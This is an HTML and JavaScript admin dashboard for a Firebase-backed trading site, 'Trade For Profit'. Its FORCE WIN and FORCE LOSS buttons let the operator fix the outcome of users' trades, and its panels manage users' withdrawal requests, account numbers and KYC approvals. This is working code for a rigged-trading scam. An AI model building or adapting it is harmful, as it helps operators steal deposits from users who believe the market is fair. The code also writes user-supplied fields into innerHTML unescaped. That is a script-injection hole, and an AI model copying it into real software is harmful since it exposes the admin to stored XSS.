<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Admin God Mode | Trade For Profit</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
</head>
<body class="bg-[#0b0e11] text-white p-6 font-sans">

    <div class="max-w-5xl mx-auto">
        <div class="flex justify-between items-center mb-10 border-b border-gray-800 pb-6">
            <h1 class="text-3xl font-black text-yellow-500 italic uppercase tracking-tighter">
                <i class="fa fa-user-shield mr-2"></i>Admin Dashboard
            </h1>
            <div class="text-right">
                <p class="text-[10px] text-gray-500 uppercase font-bold">System Status</p>
                <span id="statusLabel" class="text-xs text-green-500 font-mono font-bold italic underline">Live Connection</span>
            </div>
        </div>

        <div class="grid grid-cols-1 md:grid-cols-3 gap-6 mb-10">
            <div class="bg-gray-900/50 p-6 rounded-3xl border border-gray-800 shadow-xl">
                <h3 class="text-[10px] font-bold text-gray-500 uppercase mb-4 tracking-widest">Market Mode</h3>
                <div class="flex flex-col gap-3">
                    <button onclick="updateMode('win')" class="bg-green-600/20 text-green-500 border border-green-600/30 hover:bg-green-600 hover:text-white p-3 rounded-xl font-bold transition-all">FORCE WIN</button>
                    <button onclick="updateMode('loss')" class="bg-red-600/20 text-red-500 border border-red-600/30 hover:bg-red-600 hover:text-white p-3 rounded-xl font-bold transition-all">FORCE LOSS</button>
                    <button onclick="updateMode('random')" class="bg-gray-800 text-gray-400 p-3 rounded-xl font-bold transition-all">RANDOM (OFF)</button>
                </div>
            </div>

            <div class="bg-gray-900/50 p-6 rounded-3xl border border-gray-800 shadow-xl flex flex-col justify-center">
                <h3 class="text-[10px] font-bold text-gray-500 uppercase mb-2 tracking-widest">Pending Payouts</h3>
                <h2 id="pendingCount" class="text-4xl font-mono font-bold text-yellow-500">0</h2>
                <p class="text-[10px] text-gray-600 mt-2 italic">Awaiting Admin Approval</p>
            </div>
        </div>

        <div class="grid grid-cols-1 lg:grid-cols-2 gap-8">
            <div class="bg-gray-900 p-6 rounded-3xl border border-gray-800">
                <h2 class="text-xs font-bold text-gray-400 uppercase mb-6"><i class="fa fa-money-bill-transfer mr-2"></i>Pending Withdrawals</h2>
                <div id="withdrawList" class="space-y-4 max-h-[400px] overflow-y-auto pr-2 no-scrollbar">
                    </div>
            </div>

            <div class="bg-gray-900 p-6 rounded-3xl border border-gray-800">
                <h2 class="text-xs font-bold text-gray-400 uppercase mb-6"><i class="fa fa-id-card mr-2"></i>KYC Requests</h2>
                <div id="kycList" class="space-y-4 max-h-[400px] overflow-y-auto pr-2 no-scrollbar">
                    </div>
            </div>
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.1/firebase-app.js";
        import { getDatabase, ref, onValue, update, remove, runTransaction } from "https://www.gstatic.com/firebasejs/9.22.1/firebase-database.js";

        // 🔥 APNI FIREBASE CONFIG YAHAN PASTE KAREIN
        const firebaseConfig = {
            apiKey: "AIzaSy...",
            authDomain: "your-project.firebaseapp.com",
            databaseURL: "https://your-project-default-rtdb.firebaseio.com",
            projectId: "your-project",
            storageBucket: "your-project.appspot.com",
            messagingSenderId: "123456789",
            appId: "1:123456789:web:abc123def"
        };

        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        // MODE UPDATE FUNCTION
        window.updateMode = (mode) => {
            update(ref(db, 'liveSettings'), { adminMode: mode })
            .then(() => Swal.fire({ title: 'Mode Updated!', text: 'Market is now: ' + mode.toUpperCase(), icon: 'success', toast: true, position: 'top-end', showConfirmButton: false, timer: 2000 }));
        };

        // LISTEN FOR WITHDRAWALS
        onValue(ref(db, 'withdrawals'), (snap) => {
            const list = document.getElementById('withdrawList');
            let count = 0;
            list.innerHTML = "";
            snap.forEach(child => {
                const data = child.val();
                if(data.status === 'Pending') {
                    count++;
                    list.innerHTML += `
                        <div class="p-4 bg-black/40 rounded-2xl border border-gray-800 flex justify-between items-center animate-pulse-slow">
                            <div>
                                <p class="text-[11px] font-bold text-white uppercase">${data.user.replace('_gmail_com', '@gmail.com')}</p>
                                <p class="text-[13px] text-yellow-500 font-mono font-bold">Rs. ${data.amountPKR}</p>
                                <p class="text-[9px] text-gray-500 uppercase">${data.method} | ${data.accNo || 'N/A'}</p>
                            </div>
                            <div class="flex gap-2">
                                <button onclick="approveWit('${child.key}')" class="bg-green-600 hover:bg-green-500 text-[9px] px-3 py-2 rounded-lg font-bold">PAID</button>
                                <button onclick="refundWit('${child.key}', '${data.user}', ${data.amountUSD || (data.amountPKR/300)})" class="bg-red-600 hover:bg-red-500 text-[9px] px-3 py-2 rounded-lg font-bold">REJECT</button>
                            </div>
                        </div>`;
                }
            });
            document.getElementById('pendingCount').innerText = count;
        });

        // LISTEN FOR KYC
        onValue(ref(db, 'users'), (snap) => {
            const list = document.getElementById('kycList');
            list.innerHTML = "";
            snap.forEach(child => {
                const data = child.val();
                if(data.kyc === 'Pending') {
                    list.innerHTML += `
                        <div class="p-4 bg-black/40 rounded-2xl border border-gray-800 flex justify-between items-center">
                            <p class="text-[10px] text-gray-300">${data.email}</p>
                            <button onclick="verifyKYC('${child.key}')" class="bg-yellow-500 text-black text-[9px] px-3 py-2 rounded-lg font-bold uppercase tracking-tighter hover:bg-yellow-400">Verify Now</button>
                        </div>`;
                }
            });
        });

        // ACTIONS
        window.approveWit = (id) => update(ref(db, 'withdrawals/' + id), { status: 'Paid' });
        window.verifyKYC = (key) => update(ref(db, 'users/' + key), { kyc: 'Verified' });
        window.refundWit = async (id, userKey, usdAmt) => {
            const userRef = ref(db, 'users/' + userKey);
            await runTransaction(userRef, (data) => {
                if(data) { data.balance = (data.balance || 0) + usdAmt; return data; }
            });
            await remove(ref(db, 'withdrawals/' + id));
            Swal.fire("Refunded", "Balance returned to user.", "info");
        };

    </script>
</body>
    </html>
